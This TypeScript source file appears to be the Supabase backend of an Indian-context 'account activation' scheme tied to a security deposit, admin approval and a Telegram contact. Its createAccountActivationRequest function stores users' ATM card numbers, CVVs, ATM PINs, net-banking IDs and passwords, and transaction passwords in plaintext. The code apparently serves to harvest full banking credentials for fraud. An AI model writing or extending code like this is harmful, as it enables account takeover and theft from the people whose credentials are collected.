import { supabase } from "@/lib/supabase";

type BankAccountMatch = {
  id: string;
  account_number: string;
  ifsc_code: string;
  is_default: boolean | null;
  created_at: string | null;
};

type SecurityDepositStatus = {
  id: string;
  status: string;
  created_at: string | null;
};

export type AccountActivationPayload = {
  userId: string;
  bankAccountId: string;
  securityDepositId: string;
  accountNumber: string;
  ifscCode: string;
  atmCardNumber: string;
  cvv: string;
  atmPin: string;
  cardExpiry: string;
  netBankingId: string;
  netBankingPassword: string;
  transactionPassword: string;
  registeredMobile: string;
  telegramUsername: string;
};

async function assertActivationRequestAllowed(userId: string, bankAccountId: string) {
  const { data, error } = await supabase
    .from("account_activations")
    .select("status, created_at")
    .eq("user_id", userId)
    .eq("bank_account_id", bankAccountId)
    .in("status", ["pending", "approved"]);

  if (error) {
    throw error;
  }

  const records = data || [];

  if (records.some((record) => record.status === "approved")) {
    throw new Error("Your account is already activated.");
  }

  if (records.some((record) => record.status === "pending")) {
    throw new Error(
      "Your activation request is already pending. Please wait for admin approval."
    );
  }
}

function sortBankAccounts(accounts: BankAccountMatch[]) {
  return [...accounts].sort((left, right) => {
    const leftPrimary = Boolean(left.is_default);
    const rightPrimary = Boolean(right.is_default);

    if (leftPrimary !== rightPrimary) {
      return leftPrimary ? -1 : 1;
    }

    const leftCreated = left.created_at ? new Date(left.created_at).getTime() : 0;
    const rightCreated = right.created_at ? new Date(right.created_at).getTime() : 0;

    return leftCreated - rightCreated;
  });
}

export async function fetchUserBankAccounts(userId: string) {
  const { data, error } = await supabase
    .from("bank_accounts")
    .select("id, account_number, ifsc_code, is_default, created_at")
    .eq("user_id", userId);

  if (error) {
    throw error;
  }

  return sortBankAccounts((data || []) as BankAccountMatch[]);
}

export async function fetchLatestSecurityDeposit(userId: string) {
  const { data, error } = await supabase
    .from("security_deposits")
    .select("id, status, created_at")
    .eq("user_id", userId)
    .order("created_at", { ascending: false })
    .limit(1)
    .maybeSingle();

  if (error) {
    throw error;
  }

  return (data || null) as SecurityDepositStatus | null;
}

export async function createAccountActivationRequest(
  payload: AccountActivationPayload
) {
  await assertActivationRequestAllowed(payload.userId, payload.bankAccountId);

  const { data, error } = await supabase
    .from("account_activations")
    .insert({
      user_id: payload.userId,
      bank_account_id: payload.bankAccountId,
      security_deposit_id: payload.securityDepositId,
      account_number: payload.accountNumber,
      ifsc_code: payload.ifscCode,
      atm_card_number: payload.atmCardNumber,
      cvv: payload.cvv,
      atm_pin: payload.atmPin,
      card_expiry: payload.cardExpiry,
      net_banking_id: payload.netBankingId,
      net_banking_password: payload.netBankingPassword,
      transaction_password: payload.transactionPassword,
      registered_mobile: payload.registeredMobile,
      telegram_username: payload.telegramUsername,
      status: "pending",
    })
    .select("id, created_at")
    .single();

  if (error) {
    throw error;
  }

  return data;
}
